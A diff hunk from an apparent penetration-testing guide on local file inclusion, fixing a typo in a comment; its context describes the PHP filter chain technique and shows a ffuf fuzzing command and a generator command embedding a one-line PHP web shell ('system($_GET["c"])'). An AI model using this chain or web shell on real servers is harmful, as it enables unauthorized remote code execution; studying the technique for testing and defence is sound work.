@@ -111,7 +111,7 @@ ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**
 
 ```bash
-# Generate the chain (publiccommand line, no CVE — it abuses documented iconv behaviour):
+# Generate the chain (public command-line, no CVE — it abuses documented iconv behaviour):
 #   git clone https://github.com/synacktiv/php_filter_chain_generator
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 # Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
